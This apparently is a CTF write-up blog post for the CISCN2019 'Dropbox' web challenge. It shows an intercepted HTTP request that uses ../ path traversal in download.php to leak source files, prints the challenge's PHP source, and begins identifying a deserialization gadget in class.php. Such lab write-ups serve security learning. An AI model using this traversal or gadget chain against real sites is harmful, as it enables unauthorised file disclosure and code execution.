              <time title="Created: 2022-05-04 12:01:02 / Modified: 12:01:48" itemprop="dateCreated datePublished" datetime="2022-05-04T12:01:02+08:00">2022-05-04</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="CISCN2019-华北赛区-Day1-Web1-Dropbox"><a href="#CISCN2019-华北赛区-Day1-Web1-Dropbox" class="headerlink" title="[CISCN2019 华北赛区 Day1 Web1]Dropbox"></a>[CISCN2019 华北赛区 Day1 Web1]Dropbox</h1><h2 id="任意文件下载"><a href="#任意文件下载" class="headerlink" title="任意文件下载"></a>任意文件下载</h2><p>注册后进入网站，上传文件后，用Burp Suite拦截请求，修改请求，任意文件可下载。</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/download.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>3a15d220-2508-43a9-a971-ff055bdaf52f.node4.buuoj.cn</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>PHPSESSID=71e4c77c7af3596b74ed78af4c02a0ff</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>24</span><br><span class="line"></span><br><span class="line"><span class="language-abnf"><span class="attribute">filename</span><span class="operator">=</span>../../index.php</span></span><br></pre></td></tr></table></figure>

<p>响应中得到 <code>index.php</code> 源代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: login.php&quot;</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line"></span><br><span class="line">&lt;meta charset=<span class="string">&quot;utf-8&quot;</span>&gt;</span><br><span class="line">&lt;meta name=<span class="string">&quot;viewport&quot;</span> content=<span class="string">&quot;width=device-width, initial-scale=1, shrink-to-fit=no&quot;</span>&gt;</span><br><span class="line">&lt;title&gt;网盘管理&lt;/title&gt;</span><br><span class="line"></span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;link href=<span class="string">&quot;static/css/bootstrap.min.css&quot;</span> rel=<span class="string">&quot;stylesheet&quot;</span>&gt;</span><br><span class="line">    &lt;link href=<span class="string">&quot;static/css/panel.css&quot;</span> rel=<span class="string">&quot;stylesheet&quot;</span>&gt;</span><br><span class="line">    &lt;script src=<span class="string">&quot;static/js/jquery.min.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">    &lt;script src=<span class="string">&quot;static/js/bootstrap.bundle.min.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">    &lt;script src=<span class="string">&quot;static/js/toast.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">    &lt;script src=<span class="string">&quot;static/js/panel.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;nav aria-label=<span class="string">&quot;breadcrumb&quot;</span>&gt;</span><br><span class="line">    &lt;ol <span class="class"><span class="keyword">class</span>=&quot;<span class="title">breadcrumb</span>&quot;&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">li</span> <span class="title">class</span>=&quot;<span class="title">breadcrumb</span>-<span class="title">item</span> <span class="title">active</span>&quot;&gt;管理面板&lt;/<span class="title">li</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">li</span> <span class="title">class</span>=&quot;<span class="title">breadcrumb</span>-<span class="title">item</span> <span class="title">active</span>&quot;&gt;&lt;<span class="title">label</span> <span class="title">for</span>=&quot;<span class="title">fileInput</span>&quot; <span class="title">class</span>=&quot;<span class="title">fileLabel</span>&quot;&gt;上传文件&lt;/<span class="title">label</span>&gt;&lt;/<span class="title">li</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">li</span> <span class="title">class</span>=&quot;<span class="title">active</span> <span class="title">ml</span>-<span class="title">auto</span>&quot;&gt;&lt;<span class="title">a</span> <span class="title">href</span>=&quot;#&quot;&gt;你好 &lt;?<span class="title">php</span> <span class="title">echo</span> $<span class="title">_SESSION</span>[&#x27;<span class="title">username</span>&#x27;]?&gt;&lt;/<span class="title">a</span>&gt;&lt;/<span class="title">li</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;/<span class="title">ol</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">nav</span>&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">file</span>&quot; <span class="title">id</span>=&quot;<span class="title">fileInput</span>&quot; <span class="title">class</span>=&quot;<span class="title">hidden</span>&quot;&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">top</span>&quot; <span class="title">id</span>=&quot;<span class="title">toast</span>-<span class="title">container</span>&quot;&gt;&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">&lt;?<span class="title">php</span></span></span><br><span class="line"><span class="class"><span class="title">include</span> &quot;<span class="title">class</span>.<span class="title">php</span>&quot;;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">$<span class="title">a</span> = <span class="title">new</span> <span class="title">FileList</span>($<span class="title">_SESSION</span>[&#x27;<span class="title">sandbox</span>&#x27;]);</span></span><br><span class="line"><span class="class">$<span class="title">a</span>-&gt;<span class="title">Name</span>();</span></span><br><span class="line"><span class="class">$<span class="title">a</span>-&gt;<span class="title">Size</span>();</span></span><br><span class="line"><span class="class">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>根据 <code>index.php</code> 中的提示，说明还有 <code>class.php</code>，读取 <code>class.php</code> 源码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$dbaddr</span> = <span class="string">&quot;127.0.0.1&quot;</span>;</span><br><span class="line"><span class="variable">$dbuser</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line"><span class="variable">$dbpass</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line"><span class="variable">$dbname</span> = <span class="string">&quot;dropbox&quot;</span>;</span><br><span class="line"><span class="variable">$db</span> = <span class="keyword">new</span> <span class="title function_ invoke__">mysqli</span>(<span class="variable">$dbaddr</span>, <span class="variable">$dbuser</span>, <span class="variable">$dbpass</span>, <span class="variable">$dbname</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$db</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$db</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;db = <span class="variable">$db</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">user_exist</span>(<span class="params"><span class="variable">$username</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$stmt</span> = <span class="variable language_">$this</span>-&gt;db-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&quot;SELECT `username` FROM `users` WHERE `username` = ? LIMIT 1;&quot;</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">bind_param</span>(<span class="string">&quot;s&quot;</span>, <span class="variable">$username</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">store_result</span>();</span><br><span class="line">        <span class="variable">$count</span> = <span class="variable">$stmt</span>-&gt;num_rows;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$count</span> === <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">add_user</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$password</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">user_exist</span>(<span class="variable">$username</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$password</span> = <span class="title function_ invoke__">sha1</span>(<span class="variable">$password</span> . <span class="string">&quot;SiAchGHmFx&quot;</span>);</span><br><span class="line">        <span class="variable">$stmt</span> = <span class="variable language_">$this</span>-&gt;db-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&quot;INSERT INTO `users` (`id`, `username`, `password`) VALUES (NULL, ?, ?);&quot;</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">bind_param</span>(<span class="string">&quot;ss&quot;</span>, <span class="variable">$username</span>, <span class="variable">$password</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">verify_user</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$password</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">user_exist</span>(<span class="variable">$username</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$password</span> = <span class="title function_ invoke__">sha1</span>(<span class="variable">$password</span> . <span class="string">&quot;SiAchGHmFx&quot;</span>);</span><br><span class="line">        <span class="variable">$stmt</span> = <span class="variable language_">$this</span>-&gt;db-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&quot;SELECT `password` FROM `users` WHERE `username` = ?;&quot;</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">bind_param</span>(<span class="string">&quot;s&quot;</span>, <span class="variable">$username</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">bind_result</span>(<span class="variable">$expect</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">fetch</span>();</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$expect</span>) &amp;&amp; <span class="variable">$expect</span> === <span class="variable">$password</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;db-&gt;<span class="title function_ invoke__">close</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileList</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$files</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$results</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$funcs</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$path</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;files = <span class="keyword">array</span>();</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;results = <span class="keyword">array</span>();</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;funcs = <span class="keyword">array</span>();</span><br><span class="line">        <span class="variable">$filenames</span> = <span class="title function_ invoke__">scandir</span>(<span class="variable">$path</span>); <span class="comment">//返回我们上传文件的所有文件名</span></span><br><span class="line"></span><br><span class="line">        <span class="variable">$key</span> = <span class="title function_ invoke__">array_search</span>(<span class="string">&quot;.&quot;</span>, <span class="variable">$filenames</span>);</span><br><span class="line">        <span class="keyword">unset</span>(<span class="variable">$filenames</span>[<span class="variable">$key</span>]);</span><br><span class="line">        <span class="variable">$key</span> = <span class="title function_ invoke__">array_search</span>(<span class="string">&quot;..&quot;</span>, <span class="variable">$filenames</span>);</span><br><span class="line">        <span class="keyword">unset</span>(<span class="variable">$filenames</span>[<span class="variable">$key</span>]);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$filenames</span> <span class="keyword">as</span> <span class="variable">$filename</span>) &#123;</span><br><span class="line">            <span class="variable">$file</span> = <span class="keyword">new</span> <span class="title class_">File</span>();</span><br><span class="line">            <span class="variable">$file</span>-&gt;<span class="title function_ invoke__">open</span>(<span class="variable">$path</span> . <span class="variable">$filename</span>);</span><br><span class="line">            <span class="title function_ invoke__">array_push</span>(<span class="variable">$this</span>-&gt;files, <span class="variable">$file</span>); <span class="comment">// 把File对象加入到files数组</span></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;results[<span class="variable">$file</span>-&gt;<span class="title function_ invoke__">name</span>()] = <span class="keyword">array</span>(); <span class="comment">// results 是个数组，保存以我们上传的文件名作为键值，每个文件名键值映射一个数组。</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$args</span></span>) </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">array_push</span>(<span class="variable">$this</span>-&gt;funcs, <span class="variable">$func</span>);</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;files <span class="keyword">as</span> <span class="variable">$file</span>) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;results[<span class="variable">$file</span>-&gt;<span class="title function_ invoke__">name</span>()][<span class="variable">$func</span>] = <span class="variable">$file</span>-&gt;<span class="variable">$func</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$table</span> = <span class="string">&#x27;&lt;div id=&quot;container&quot; class=&quot;container&quot;&gt;&lt;div class=&quot;table-responsive&quot;&gt;&lt;table id=&quot;table&quot; class=&quot;table table-bordered table-hover sm-font&quot;&gt;&#x27;</span>;</span><br><span class="line">        <span class="variable">$table</span> .= <span class="string">&#x27;&lt;thead&gt;&lt;tr&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;funcs <span class="keyword">as</span> <span class="variable">$func</span>) &#123;</span><br><span class="line">            <span class="variable">$table</span> .= <span class="string">&#x27;&lt;th scope=&quot;col&quot; class=&quot;text-center&quot;&gt;&#x27;</span> . <span class="title function_ invoke__">htmlentities</span>(<span class="variable">$func</span>) . <span class="string">&#x27;&lt;/th&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$table</span> .= <span class="string">&#x27;&lt;th scope=&quot;col&quot; class=&quot;text-center&quot;&gt;Opt&lt;/th&gt;&#x27;</span>;</span><br><span class="line">        <span class="variable">$table</span> .= <span class="string">&#x27;&lt;/thead&gt;&lt;tbody&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;results <span class="keyword">as</span> <span class="variable">$filename</span> =&gt; <span class="variable">$result</span>) &#123; <span class="comment">// 每次把每个一级数组的值，传递给$result,即filename1[]</span></span><br><span class="line">            <span class="variable">$table</span> .= <span class="string">&#x27;&lt;tr&gt;&#x27;</span>;</span><br><span class="line">            <span class="keyword">foreach</span> (<span class="variable">$result</span> <span class="keyword">as</span> <span class="variable">$func</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">                <span class="variable">$table</span> .= <span class="string">&#x27;&lt;td class=&quot;text-center&quot;&gt;&#x27;</span> . <span class="title function_ invoke__">htmlentities</span>(<span class="variable">$value</span>) . <span class="string">&#x27;&lt;/td&gt;&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$table</span> .= <span class="string">&#x27;&lt;td class=&quot;text-center&quot; filename=&quot;&#x27;</span> . <span class="title function_ invoke__">htmlentities</span>(<span class="variable">$filename</span>) . <span class="string">&#x27;&quot;&gt;&lt;a href=&quot;#&quot; class=&quot;download&quot;&gt;下载&lt;/a&gt; / &lt;a href=&quot;#&quot; class=&quot;delete&quot;&gt;删除&lt;/a&gt;&lt;/td&gt;&#x27;</span>;</span><br><span class="line">            <span class="variable">$table</span> .= <span class="string">&#x27;&lt;/tr&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$table</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">open</span>(<span class="params"><span class="variable">$filename</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;filename = <span class="variable">$filename</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="variable">$filename</span>) &amp;&amp; !<span class="title function_ invoke__">is_dir</span>(<span class="variable">$filename</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">name</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">basename</span>(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">size</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$size</span> = <span class="title function_ invoke__">filesize</span>(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">        <span class="variable">$units</span> = <span class="keyword">array</span>(<span class="string">&#x27; B&#x27;</span>, <span class="string">&#x27; KB&#x27;</span>, <span class="string">&#x27; MB&#x27;</span>, <span class="string">&#x27; GB&#x27;</span>, <span class="string">&#x27; TB&#x27;</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$size</span> &gt;= <span class="number">1024</span> &amp;&amp; <span class="variable">$i</span> &lt; <span class="number">4</span>; <span class="variable">$i</span>++) <span class="variable">$size</span> /= <span class="number">1024</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">round</span>(<span class="variable">$size</span>, <span class="number">2</span>).<span class="variable">$units</span>[<span class="variable">$i</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">detele</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">unlink</span>(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">close</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">````</span><br><span class="line"></span><br><span class="line">继续读取 `download.php`</span><br><span class="line"></span><br><span class="line">```php</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: login.php&quot;</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;filename&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;class.php&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;open_basedir&quot;</span>, <span class="title function_ invoke__">getcwd</span>() . <span class="string">&quot;:/etc:/tmp&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">chdir</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;sandbox&#x27;</span>]);</span><br><span class="line"><span class="variable">$file</span> = <span class="keyword">new</span> <span class="title class_">File</span>();</span><br><span class="line"><span class="variable">$filename</span> = (<span class="keyword">string</span>) <span class="variable">$_POST</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$filename</span>) &lt; <span class="number">40</span> &amp;&amp; <span class="variable">$file</span>-&gt;<span class="title function_ invoke__">open</span>(<span class="variable">$filename</span>) &amp;&amp; <span class="title function_ invoke__">stristr</span>(<span class="variable">$filename</span>, <span class="string">&quot;flag&quot;</span>) === <span class="literal">false</span>) &#123;</span><br><span class="line">    <span class="title function_ invoke__">Header</span>(<span class="string">&quot;Content-type: application/octet-stream&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">Header</span>(<span class="string">&quot;Content-Disposition: attachment; filename=&quot;</span> . <span class="title function_ invoke__">basename</span>(<span class="variable">$filename</span>));</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$file</span>-&gt;<span class="title function_ invoke__">close</span>();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;File not exist&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>


<h2 id="反序列化漏洞"><a href="#反序列化漏洞" class="headerlink" title="反序列化漏洞"></a>反序列化漏洞</h2><p>根据题意所得，题目猜测的是反序列化。</p>
<h3 id="寻找反序列化的魔术函数"><a href="#寻找反序列化的魔术函数" class="headerlink" title="寻找反序列化的魔术函数"></a>寻找反序列化的魔术函数</h3><p><code>class.php</code> 中涉及到反序列化的魔术方法为 <code>User-&gt;__destruct()</code>,调用 <code>$this-&gt;db-&gt;close()</code> 函数，其中 <code>$this-&gt;db</code> 可控。</p>
